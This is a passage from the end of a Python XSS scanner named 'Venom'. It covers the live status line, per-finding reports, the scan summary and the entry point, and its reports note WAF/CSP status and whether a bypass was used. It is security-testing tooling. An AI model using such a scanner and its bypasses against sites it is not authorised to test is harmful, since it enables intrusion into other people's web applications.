                 f"{GREEN}║{RESET} Progress: {WHITE}{progress:.1f}%{RESET}  Tests: {WHITE}{self.total_tests.get()}/{self.total_payloads}{RESET}  Vulns: {WHITE}{len(self.vulnerabilities)}{RESET}\n" \
                 f"{GREEN}║{RESET} Payload: {YELLOW}{self.current_payload}{RESET}\n" \
                 f"{GREEN}║{RESET} Elapsed: {WHITE}{elapsed}s{RESET}\n" \
                 f"{GREEN}╚═════════════════════╝{RESET}"
        sys.stdout.write(f"\033[2K\r{status}")
        sys.stdout.flush()

    def report_vulnerability(self, url: str, payload: str, params: dict, vuln_type: str = 'XSS', popup: bool = False) -> None:
        with self.lock:
            if not payload.strip():
                logging.info(f"Skipping empty payload report for {url}")
                return
            full_url = url + ('?' + urlencode(params) if self.args.method in ['get', 'both'] and params else '')
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            vuln = {
                'url': full_url,
                'payload': payload,
                'type': vuln_type,
                'timestamp': timestamp,
                'executed': popup,
                'context': 'JavaScript' if 'script' in payload.lower() or 'javascript:' in payload.lower() else 'HTML',
                'waf_status': self.waf_csp_status,
                'bypass': "Yes" if self.bypass_performed or self.use_403_bypass else "No",
                'params': params,
                'method': self.args.method if self.args.method != 'both' else 'post' if 'Form' in vuln_type else 'get'
            }
            if vuln in self.vulnerabilities:
                return
            self.vulnerabilities.append(vuln)

            severity = vuln_type.split("Severity: ")[1].split(")")[0] if "Severity: " in vuln_type else "Low"
            color = GREEN if "Low" in severity else YELLOW if "Medium" in severity else ORANGE if "High" in severity else RED

            output = f"{color}╔════ XSS DETECTED [{timestamp}] ════╗{RESET}\n" \
                     f"{color}║{RESET} Type: {WHITE}{vuln_type}{RESET}\n" \
                     f"{color}║{RESET} URL: {WHITE}{full_url}{RESET}\n" \
                     f"{color}║{RESET} Payload: {YELLOW}{payload}{RESET}\n" \
                     f"{color}║{RESET} Context: {WHITE}{vuln['context']}{RESET}\n" \
                     f"{color}║{RESET} Executed: {WHITE}{'Yes' if popup else 'No'}{RESET}\n" \
                     f"{color}║{RESET} WAF/CSP: {WHITE}{self.waf_csp_status}{RESET} | Bypass: {WHITE}{'Yes' if self.bypass_performed or self.use_403_bypass else 'No'}{RESET}\n" \
                     f"{color}║{RESET} Verify: {WHITE}curl -X {vuln['method'].upper()} \"{full_url}\" {'-d \"' + urlencode(params) + '\"' if vuln['method'] == 'post' and params else ''}{RESET}\n"
            if popup and "High" in severity:
                output += f"{color}║{RESET} Proof: {GREEN}Potential execution detected!{RESET}\n"
            output += f"{color}╚════════════════════════════════════╝{RESET}"
            print(output, flush=True)
            logging.info(output)

    def report(self) -> None:
        runtime = int(time.time() - self.start_time)
        executed_count = sum(1 for v in self.vulnerabilities if v['executed'])
        summary = f"{GREEN}╔════════════════════════════════════╗{RESET}\n" \
                  f"{GREEN}║       Venom XSS Scan Summary       ║{RESET}\n" \
                  f"{GREEN}╚════════════════════════════════════╝{RESET}\n" \
                  f"{WHITE}Scan Started:{RESET} {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}\n" \
                  f"{WHITE}Scan Ended:{RESET} {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n" \
                  f"{WHITE}Total Runtime:{RESET} {runtime} seconds\n" \
                  f"{WHITE}URLs Scanned:{RESET} {len(self.visited_urls)}\n" \
                  f"{WHITE}Tests Performed:{RESET} {self.total_tests.get()}\n" \
                  f"{WHITE}Vulnerabilities Found:{RESET} {len(self.vulnerabilities)}\n" \
                  f"{WHITE}Executable Vulnerabilities:{RESET} {executed_count}\n" \
                  f"{WHITE}Reflected Only:{RESET} {len(self.vulnerabilities) - executed_count}\n"
        print(summary)
        logging.info(summary)
        
        if self.vulnerabilities:
            findings = f"\n{GREEN}╔════════════════════════════════════╗{RESET}\n" \
                       f"{GREEN}║       Detailed XSS Findings        ║{RESET}\n" \
                       f"{GREEN}╚════════════════════════════════════╝{RESET}\n"
            if self.args.full_report or len(self.vulnerabilities) <= 10:
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    severity = vuln['type'].split("Severity: ")[1].split(")")[0] if "Severity: " in vuln['type'] else "Low"
                    color = GREEN if "Low" in severity else YELLOW if "Medium" in severity else ORANGE if "High" in severity else RED
                    findings += f"{color}Vulnerability #{i}{RESET}\n" \
                                f"  {WHITE}Timestamp:{RESET} {vuln['timestamp']}\n" \
                                f"  {WHITE}Type:{RESET} {vuln['type']}\n" \
                                f"  {WHITE}URL:{RESET} {vuln['url']}\n" \
                                f"  {WHITE}Payload:{RESET} {vuln['payload']}\n" \
                                f"  {WHITE}Context:{RESET} {vuln['context']}\n" \
                                f"  {WHITE}Executed:{RESET} {'Yes' if vuln['executed'] else 'No'}\n" \
                                f"  {WHITE}WAF/CSP Status:{RESET} {vuln['waf_status']}\n" \
                                f"  {WHITE}Bypass Used:{RESET} {vuln['bypass']}\n" \
                                f"  {WHITE}Verification:{RESET} curl -X {vuln['method'].upper()} \"{vuln['url']}\" {'-d \"' + urlencode(vuln['params']) + '\"' if vuln['method'] == 'post' and vuln['params'] else ''}\n" \
                                f"{GREEN}{'─' * 50}{RESET}\n"
            else:
                findings += f"Showing first 10 vulnerabilities (use --full-report for all):\n"
                for i, vuln in enumerate(self.vulnerabilities[:10], 1):
                    severity = vuln['type'].split("Severity: ")[1].split(")")[0] if "Severity: " in vuln['type'] else "Low"
                    color = GREEN if "Low" in severity else YELLOW if "Medium" in severity else ORANGE if "High" in severity else RED
                    findings += f"{color}Vulnerability #{i}{RESET}\n" \
                                f"  {WHITE}Timestamp:{RESET} {vuln['timestamp']}\n" \
                                f"  {WHITE}Type:{RESET} {vuln['type']}\n" \
                                f"  {WHITE}URL:{RESET} {vuln['url']}\n" \
                                f"  {WHITE}Payload:{RESET} {vuln['payload']}\n" \
                                f"  {WHITE}Context:{RESET} {vuln['context']}\n" \
                                f"  {WHITE}Executed:{RESET} {'Yes' if vuln['executed'] else 'No'}\n" \
                                f"  {WHITE}WAF/CSP Status:{RESET} {vuln['waf_status']}\n" \
                                f"  {WHITE}Bypass Used:{RESET} {vuln['bypass']}\n" \
                                f"  {WHITE}Verification:{RESET} curl -X {vuln['method'].upper()} \"{vuln['url']}\" {'-d \"' + urlencode(vuln['params']) + '\"' if vuln['method'] == 'post' and vuln['params'] else ''}\n" \
                                f"{GREEN}{'─' * 50}{RESET}\n"
            findings += f"{GREEN}Total Confirmed XSS Vulnerabilities: {len(self.vulnerabilities)}{RESET}\n"
            print(findings)
            logging.info(findings)
        else:
            print(f"\n{YELLOW}[!] No XSS vulnerabilities detected.{RESET}\n")
            logging.info("No XSS vulnerabilities detected.")

if __name__ == "__main__":
    args = parse_args()
    scanner = None
    try:
        scanner = Venom(args)
        scanner.scan()
    except KeyboardInterrupt:
        logging.info("Scan interrupted by user")
        if scanner:
            scanner.running = False
            scanner.report()
        sys.exit(0)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        if scanner:
            scanner.report()
        sys.exit(1)
    finally:
        if scanner:
            scanner.report()
    input("Press Enter to exit...")
